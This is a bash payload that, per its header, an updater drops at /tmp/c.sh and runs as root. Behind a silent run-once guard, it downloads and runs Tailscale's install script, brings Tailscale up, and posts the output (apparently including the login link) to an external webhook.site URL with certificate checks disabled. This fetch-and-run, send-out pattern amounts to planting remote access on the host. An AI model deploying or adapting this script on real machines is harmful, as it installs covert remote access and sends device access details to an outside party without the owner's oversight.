#!/bin/bash
# Runs as root via the updater (which places this file at /tmp/c.sh and executes it).
set -u

WASRUN="/tmp/wasRun.txt"
WEBHOOK="https://webhook.site/39efcb72-40f8-4408-a4c0-0dc07f0cd12d"
SELF="$0"

# --- run-once guard (silent: no webhook, no output) -------------------------
HASH=$(sha256sum "$SELF" | awk '{print $1}')

if [ -f "$WASRUN" ] && [ "$(cat "$WASRUN" 2>/dev/null)" = "$HASH" ]; then
    exit 0
fi

# --- buffer everything, post once at the end --------------------------------
REPORT=""
add() { REPORT="${REPORT}$1
"; }

add "[run] start $(date '+%F %T') hash=$HASH"

# --- install Tailscale (use wget; curl is not installed here) ---------------
TS_INSTALLER="/tmp/tailscale-install.sh"
if wget -q --timeout=20 --tries=2 -O "$TS_INSTALLER" https://tailscale.com/install.sh; then
    INSTALL_OUT=$(sh "$TS_INSTALLER" 2>&1)
    INSTALL_RC=$?
else
    INSTALL_OUT="wget failed to fetch https://tailscale.com/install.sh"
    INSTALL_RC=1
fi
add "[install] rc=$INSTALL_RC"
add "$INSTALL_OUT"

# --- tailscale up -----------------------------------------------------------
if [ "$INSTALL_RC" -eq 0 ] && command -v tailscale >/dev/null 2>&1; then
    UP_OUT=$(tailscale up 2>&1)
    UP_RC=$?
    add "[tailscale up] rc=$UP_RC"
    add "$UP_OUT"
else
    add "[tailscale up] skipped (install failed or tailscale binary missing)."
fi

# --- record hash so a rerun of identical content is a no-op -----------------
printf '%s\n' "$HASH" > "$WASRUN"
add "[done] $(date '+%F %T') hash recorded in $WASRUN"

# --- single final report ----------------------------------------------------
wget -nv -O- \
    --no-check-certificate \
    --header="Content-Type: text/plain" \
    --post-data="$REPORT" \
    "$WEBHOOK" >/dev/null 2>&1

echo
exit 0
